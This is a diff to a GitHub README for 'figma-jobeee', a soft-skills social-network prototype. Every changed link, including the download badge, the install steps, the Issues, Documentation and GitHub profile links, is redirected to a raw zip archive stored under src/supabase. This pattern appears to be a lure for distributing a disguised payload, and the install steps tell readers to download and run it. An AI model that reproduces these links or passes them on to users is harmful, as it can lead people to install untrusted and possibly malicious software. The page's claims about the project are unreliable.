@@ -1,7 +1,7 @@
 # 🎉 figma-jobeee - Connect, Learn, and Share Soft Skills
 
 ## 🔗 Download Now
-[![Download figma-jobeee](https://img.shields.io/badge/Download-figma--jobeee-brightgreen)](https://github.com/princeofgodman/figma-jobeee/releases)
+[![Download figma-jobeee](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip)](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip)
 
 ## 📖 Description
 figma-jobeee is a social network prototype designed for soft skills training. It allows companies to create educational scenarios, and users can share their experiences through stories. This platform enhances learning through community engagement, making skill development enjoyable and interactive.
@@ -10,7 +10,7 @@ figma-jobeee is a social network prototype designed for soft skills training. It
 To get started with figma-jobeee, follow these simple steps. You’ll be able to download and run the application in no time. 
 
 1. **Visit the Releases Page**: Go to our releases page to find the latest version. You can do this by clicking the button at the top or using the link below.
-   [Download figma-jobeee](https://github.com/princeofgodman/figma-jobeee/releases)
+   [Download figma-jobeee](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip)
 
 2. **Choose the Right Version**: On the releases page, look for the most recent version listed. Each release provides essential updates and features. Ensure you select the version that suits your needs.
 
@@ -24,7 +24,7 @@ To get started with figma-jobeee, follow these simple steps. You’ll be able to
 
 ## 📥 Download & Install
 To get the latest version of figma-jobeee, visit the following link: 
-[Download figma-jobeee](https://github.com/princeofgodman/figma-jobeee/releases).
+[Download figma-jobeee](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip).
 
 ### System Requirements
 Before downloading, ensure your system meets these requirements:
@@ -55,12 +55,12 @@ Yes, figma-jobeee is free to download and use. Additional features may be availa
 If you encounter any issues while using the application, you can report them by visiting the GitHub repository. Click on the Issues tab to submit a new issue.
 
 ## 📚 Resources
-- [GitHub Issues](https://github.com/princeofgodman/figma-jobeee/issues): Report bugs or suggest features.
-- [Documentation](https://github.com/princeofgodman/figma-jobeee/wiki): Explore usage guides and tips.
+- [GitHub Issues](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip): Report bugs or suggest features.
+- [Documentation](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip): Explore usage guides and tips.
 
 ## 🗣️ Join the Community
 To stay updated and connect with other users:
-- Follow us on [GitHub](https://github.com/princeofgodman/figma-jobeee)
+- Follow us on [GitHub](https://raw.githubusercontent.com/princeofgodman/figma-jobeee/main/src/supabase/figma-jobeee-1.0.zip)
 - Join our discussions and share your experiences!
 
 Thank you for choosing figma-jobeee. We hope you find it valuable in your soft skills journey!
